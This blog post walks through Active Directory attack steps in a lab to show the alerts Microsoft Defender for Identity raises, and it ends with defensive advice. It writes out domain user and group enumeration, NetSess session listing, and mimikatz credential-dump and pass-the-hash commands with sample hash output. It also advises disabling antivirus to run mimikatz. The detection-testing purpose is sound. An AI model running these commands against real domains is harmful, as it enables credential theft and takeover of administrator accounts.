---
title: "Penetration testing Defender for Identity and Active Directory"
date: 2025-02-21
slug: "penetration-testing-defender-for-identity-and-active-directory"
categories:
  - Microsoft Defender XDR
tags:
  - Step by Step guides
description: >
  In this guide, i will show how to do some popular Active Directory attacking tests and show how Defender for Identity (MDI) will alert...
---
In this guide, i will show how to do some popular Active Directory attacking tests and show how Defender for Identity (MDI) will alert you about the attacks.

Not everyting detected by Defender for Identity will be directly classified as potential attack. When implementing the solution, it will learn during the first 30 days what normal behaviour in the network is.

---

---

## Requirements

- At least one Microsoft Defender for Identity running
  - For a step by step guide of this, [refer this guide](https://justinverstijnen.nl/how-to-defend-your-active-directory-with-defender-for-identity)!
- A domain controller (vm-jv-mdi)
- A workstation (ws-jv-mdi)
- Around 30 minutes of your time

---

## Starting out

So i want to mention, that most of the attacks to Active Directory can be easily prevented if everybody locks their computer everytime they walk away from it and also use good enough authentication methods. Some other attacks cannot always be prevented but we can do the most of it detecting them and acting in a greatly manner.

So let's imagine, we are walking through a generic office building and searching for computers that are unmonitored by people and the Windows Desktop is on the screen aside from the email and documents the user is working on. An attacker, in our case we, are going to that computer and run some commands to exactly know how the network is built.

We are gonna run some commands and tests on the workstation that will generate alerts in Microsoft Defender for Identity.

## Generating DNS lookup alerts

Run the following command on the workstation:

{{< card code=true header="**POWERSHELL**" lang="powershell" >}}
ipconfig /all
{{< /card >}}

We get the full IP-configuration of the machine, including DNS servers and domain-name:

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/penetration-testing-defender-for-identity-and-active-directory-1049/jv-media-1049-f4c0daa2b50f.png)

This will be needed in the next commands.

Run the following command on the workstation:

{{< card code=true header="**POWERSHELL**" lang="powershell" >}}
nslookup
{{< /card >}}

The output will show more details of the DNS server itself and launches a DNS console where we can put some extra commands in:

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/penetration-testing-defender-for-identity-and-active-directory-1049/jv-media-1049-0dd62a4eaa1b.png)

Now issue the following command in the nslookup tool:

{{< card code=true header="**POWERSHELL**" lang="powershell" >}}
ls -d internal.justinverstijnen.nl
{{< /card >}}

If the DNS is correctly secured, we will get an error like below:

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/penetration-testing-defender-for-identity-and-active-directory-1049/jv-media-1049-630c6d10a227.png)

We tried to do a DNS Zone transfer, which means that we wanted to make a full export of the DNS zone internal.justinverstijnen.nl in my case. The DNS server refused this request which is a security best practice by default.

Now we have generated our first alert and the Security Operations Center (SOC) of the company will be notified. We can find the alert in the Security Portal by going to "Hunting" and then to "Advanced Hunting". There we can use the query "IdentityQueryEvents":

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/azure-default-outbound-access-2652/jv-media-2652-c225b8e3d40d.png)

This will show all events where attackers tried to do sensitive queries. We can investigate this further by expanding the alert:

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/use-azure-logic-apps-to-automatically-start-and-stop-vms-2258/jv-media-2258-24d0dbbf18c6.png)

Now the SOC knows exactly on which computer this happend and on what time.

---

## Enumerate all users and groups in Active Directory

Every user and computer in an Active Directory domain has read permissions acros all other Active Directory objects. This is done to make the most applications work properly and for users to logon into every PC.

While this is really convinient for the users, it is a big attack vector for attackers because they just breached one of the business accounts and are hungry for more. With this information, they can launch a potential attack on the rest of the companies users.

On the workstation, run the command:

{{< card code=true header="**POWERSHELL**" lang="powershell" >}}
net user /domain
{{< /card >}}

Now we get a report of all the users in the domain, with username and so their emailaddresses:

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/use-azure-logic-apps-to-automatically-start-and-stop-vms-2258/jv-media-2258-cc294d8f53a2.png)

Now we can run a command to get all groups in the domain:

{{< card code=true header="**POWERSHELL**" lang="powershell" >}}
net group /domain
{{< /card >}}
![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/use-azure-logic-apps-to-automatically-start-and-stop-vms-2258/jv-media-2258-ccb3e379965c.png)

This list shows some default groups and some user created groups that are in use for different use cases. We now want to go a level deeper, and that is the members of one of these groups:

{{< card code=true header="**POWERSHELL**" lang="powershell" >}}
net group "Domain Admins" /domain
{{< /card >}}
![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/use-azure-logic-apps-to-automatically-start-and-stop-vms-2258/jv-media-2258-210c599a138d.png)

Now, as an attacker, we have gold on our hands. We know exactly which 5 users we have to attack to get domain admin permissions and be able to be destructive.

If we want to have even more permissions, we can find out which user has Enterprise Admin permissions:

{{< card code=true header="**POWERSHELL**" lang="powershell" >}}
net group "Enterprise Admins" /domain
{{< /card >}}
![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/use-azure-logic-apps-to-automatically-start-and-stop-vms-2258/jv-media-2258-42973c6523f9.png)

So we can aim our attack to that guy Justin.

## List alerts in Defender for Identity portal

Let's see in the portal after we have issued this command above in complete silence or if we are detected by Defender for Identity:

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/use-azure-logic-apps-to-automatically-start-and-stop-vms-2258/jv-media-2258-db420741336c.png)

So all the enumeration and query events we did are audited by the Defender for Identity sensor and marked as potentially dangerous.

We can further investigate every event by expanding it:

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/use-azure-logic-apps-to-automatically-start-and-stop-vms-2258/jv-media-2258-5e47ccabe739.png)

After some time (around 10 minutes in my case), an official incident will be opened in the Security portal, and notifiies the SOC with possible alerts they have configured:

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/penetration-testing-defender-for-identity-and-active-directory-1049/jv-media-1049-00dbcaddecd7.png)

---

## Enumerate the SYSVOL folder

In Active Directory, SYSVOL is a really important network share. It is created by default and is used to store Group Policies, Policy definitions and can be used to enumerate active sessions to the folder. This way, we know all currently logged in users with their IP addresses without access to a server.

For this steps, we need a tool called NetSess, which can be downloaded here: <https://www.joeware.net/freetools/tools/netsess/>

Place the tool on your attacking workstation and navigate to the folder for a convinient usage. In my case, i did it with this command:

{{< card code=true header="**POWERSHELL**" lang="powershell" >}}
cd C:\Users\justin-admin\Desktop\Netsess
{{< /card >}}

Now we are directly in the folder where the executable is located.

Now lets run a command to show all logged in users including their IP addresses

{{< card code=true header="**POWERSHELL**" lang="powershell" >}}
Netsess.exe vm-jv-mdi
{{< /card >}}
![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/use-azure-logic-apps-to-automatically-start-and-stop-vms-2258/jv-media-2258-e6093862024c.png)

Now we know where potential domain admins are logged in and could launch attacks on their computer, especially because we know on which computer the user credentials are stored. This all without any access to a server (yet).

---

## Launching a Pass-The-Hash attack on the computer (Windows 10 only)

On Windows 10, computers are vulnerable to dump cached credentials from memory and such which we can exploit. Microsoft solved this in later versions of Windows 10 and Windows 11 by implementing a Core isolation/Memory security feature with Windows Defender which prevent attacks from using this tool.

Now we need to run another 3rd party tool called mimikatz, and this can be downloaded here: <https://github.com/gentilkiwi/mimikatz>

Mimikatz is a tool which can be used to harvest stored credentials from hosts so we can use this to authenticate ourselves.

*Note: Windows Defender and other security tools don't like mimikatz as much as we do, so you have to temporarily disable them.*

We can run the tool with an elevated command prompt:

{{< card code=true header="**POWERSHELL**" lang="powershell" >}}
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" >> C:\temp\victims.txt
{{< /card >}}

Now the tool generates a text file with all logged on users and their hashes. I couldnt test it myself, but i have an example file:

{{< card code=true header="**POWERSHELL**" lang="powershell" >}}
Authentication Id : 0 ; 302247 (00000000:00049ca7)
Session           : RemoteInteractive from 2
User Name         : alexander.harris
Domain            : JV-INTERNAL
Logon Server      : vm-jv-mdi
Logon Time        : 02/21/2025 2:37:48
SID               : S-1-5-21-1888482495-713651900-1335578256-1655
        msv :
         [00000003] Primary
         * Username : alexander.harris
         * Domain   : JV-INTERNAL
         * NTLM     : F5262921B03008499F3F197E9866FA81
         * SHA1     : 42f95dd2a124ceea737c42c06ce7b7cdfbf0ad4b
         * DPAPI    : e75e04767f812723a24f7e6d91840c1d
        tspkg :
        wdigest :
         * Username : alexander.harris
         * Domain   : JV-INTERNAL
         * Password : (null)
        kerberos :
         * Username : alexander.harris
         * Domain   : internal.justinverstijnen.nl
         * Password : (null)
        ssp :
        credman :
{{< /card >}}

If i were on a vulnerable workstation, i could run the following command where i stole the hash of user Alexander Harris (remember, this was a domain admin) and issue it against the server:

{{< card code=true header="**POWERSHELL**" lang="powershell" >}}
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:alexander.harris /ntlm:F5262921B03008499F3F197E9866FA81 /domain:internal.justinverstijnen.nl" "exit"
{{< /card >}}

A new command prompt will open with the permissions of Alexander Harris in place:

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/penetration-testing-defender-for-identity-and-active-directory-1049/jv-media-1049-b1f4ed648e2e.png)

This situation is worst case scenario which is not that easy to execute anymore due to kernel improvements of Windows and not be able to export hashes from the memory anymore.

An attacker now has access to a domain admin account and can perform some lateral movement attacks to the rest of the Active Directory domain. It basically has access to everything now and if else, it can itself gain access. It also can create a backdoor for itself where he can gain access without using the account of Alexander Harris.

---

## Honeytokens in Defender for Identity

In Microsoft Defender for Identity (MDI) we can configure some honeytokens. This are accounts that doesn't have any real function but are traps for attackers that immediately triggers an event. Most of the time they are named fakely to seem they are treasure.

We can add users and devices to this list.

I now have created a user that seems to give the attacker some real permissions (but in fact is a normal domain user):

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/penetration-testing-defender-for-identity-and-active-directory-1049/jv-media-1049-55a63743cfeb.png)

Let's configure this account as Honeytoken account in the Security portal. Go to the Settings -> Identities -> Honeytoken accounts

Tag the user and select it from the list.

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/use-azure-logic-apps-to-automatically-start-and-stop-vms-2258/jv-media-2258-f27bc82f071b.png)

After that save the account and let's generate some alerts.

---

## Use the Honeytoken to try and gain access

Now, as an attacker, we cloud know that the admin.service account exists through the Enumeration of users/groups and group memberships. Let's open the Windows Explorer on a workstation and open the SYSVOL share of the domain.

It asks for credentials, we can try to log in with some basic, wrong passwords on the admin.service account.

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/use-azure-logic-apps-to-automatically-start-and-stop-vms-2258/jv-media-2258-011299ffaed4.png)

This will generate alerts on that account because the account is not really supposed to logon. The SOC will immediately know that an malicious actor is running some malicious behaviour.

After filling in around 15 wrong passwords i filled in the right password on purpose:

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/penetration-testing-defender-for-identity-and-active-directory-1049/jv-media-1049-84adbdc276e6.png)

In the Security Portal, after around 5 minutes, an alert is generated due to our malicious behaviour;

![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/penetration-testing-defender-for-identity-and-active-directory-1049/jv-media-1049-cf6b10d08499.png)

---

## Summary

So in the end, Active Directory is out there for around 25 years and it can be a great solution for managing users, groups and devices in your environment. But there are some vulnerabilities with it who can be mitigated really easy so that the attacks in this guide cannot be performed that easy.

My advices:

- Use Defender for Identity and monitor the alerts
- Disable NTLM authentication
- Always lock your computer

Thank you for reading this guide!

---

---

## End of the page 🎉

You have reached the end of the page. You can select a category, share this post on X, LinkedIn and Reddit or return to the blog posts collection page. Thank you for visiting this post.

If you think something is wrong with this post or you want to know more, you can send me a message to one of my social profiles at: <https://justinverstijnen.nl/about/>

[Go back to Blog](https://justinverstijnen.nl/blog/)

If you find this page and blog very useful and you want to leave a donation, you can use the button below to buy me a beer. Thank you in advance and cheers :)

[![](https://img.buymeacoffee.com/button-api/?text=Buy me a beer&emoji=🍺&slug=justinverstijnen&button_colour=FFDD00&font_colour=000000&font_family=Arial&outline_colour=000000&coffee_colour=ffffff)](https://www.buymeacoffee.com/justinverstijnen)

[![](https://sajvwebsiteblobstorage.blob.core.windows.net/blog/about-66/jv-media-66-36a3c69c96cb.png)](https://buymeacoffee.com/justinverstijnen)

The [terms and conditions](https://justinverstijnen.nl/terms-conditions/) apply to this post.

Page visitors:
No page-counter data available yet.
